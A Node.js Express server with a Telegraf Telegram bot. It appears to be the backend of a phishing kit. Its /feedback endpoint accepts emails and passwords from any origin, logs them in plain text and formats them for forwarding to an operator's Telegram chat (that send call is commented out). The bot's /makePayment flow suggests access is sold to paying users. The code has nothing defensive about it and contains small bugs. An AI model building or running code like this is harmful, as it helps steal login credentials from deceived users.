const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const { Telegraf } = require("telegraf");
const { message } = require('telegraf/filters');

const app = express();

require("dotenv").config();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json()); 
app.use(cors());

const users = JSON.parse(fs.readFileSync(path.join(__dirname, "/", "users.json"), "utf-8"));
const doesUserExists = chatId => users.findIndex(user => user === chatId) === 1;

const telegramBotChatID = process.env.TELEGRAM_BOT_CHAT_ID;
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
const bot = new Telegraf(telegramBotToken);
const PORT = process.env.PORT || 5001;

bot.on(message("text"), async ctx => {
	const chatId = ctx.message.chat.id;
	const text = ctx.message.text;

	if(text === "/start") {
		if(doesUserExists(chatId)) {
			await ctx.telegram.sendMessage(ctx.message.chat.id, `Hello @${ctx.message.chat.username}`);
		} else {
			await ctx.telegram.sendMessage(ctx.message.chat.id, "Click on /getChatId to have access");
		}
	} else if(text === "/getChatId") {
		await ctx.telegram.sendMessage(ctx.message.chat.id, "Click on /makePayment, to have access to bot.");
	} else if(text === "/makePayment") {
		console.log("make payment")
	} else {
		await ctx.telegram.sendMessage(ctx.message.chat.id, `@${ctx.message.chat.username}, how are you doing?`);
	}
});

// bot.command('quit', async (ctx) => {
//   // Explicit usage
//   await ctx.telegram.leaveChat(ctx.message.chat.id)

//   // Using context shortcut
//   await ctx.leaveChat()
// });


// bot.on("message", msg => {
// 	const chatID = msg.chat.id;
// 	const text = msg.text;
	


// 	if(text === "/start") {
// 		bot.sendMessage(chatID, "Click on /getChatId to have access");
// 	} else if(text === "/getChatId") {
// 		if(doesUserExists === -1)
// 			bot.sendMessage(chatID, "You don't have access to this bot. Contact Developer to grant access./makePayment");
// 		else 
// 			bot.sendMessage(chatID, "Welcome back!");
// 	} else if(text === "/makePayment") {
// 		const updatedUsersData =  doesUserExists === -1 ? usersData.push(chatID) : userData;
// 		console.log(updatedUsersData);
// 		fs.writeFileSync(usersDatabase, JSON.stringify(updatedUsersData), "utf-8");
// 		bot.sendMessage(chatID, "You have been granted access to bot.");
// 	}
// })

app.post("/feedback", (req, res) => {
	const { email, password } = req.body;
	console.log(email, password)

	if(/^[^0-9]+[\w]+@[\w]+\.[a-zA-Z]{2,}(\.[a-zA-Z]{2,})?$/ig.exec(email) && password.length > 6) {
		try {
			const userDetail = `Email: ${email} \nPassword: ${password}`;
			// bot.sendMessage(
			// 	telegramBotChatID, 
			// 	userDetail
			// );
			res.json({ status: "success", message: "User details successfully sent" });
		} catch(error) {
			res.json({ status: "error", message: "There was an error" });
		}
	}
});

bot.launch();
process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))

app.listen(PORT, () => {
	console.log(`Server started at port ${PORT}`);
})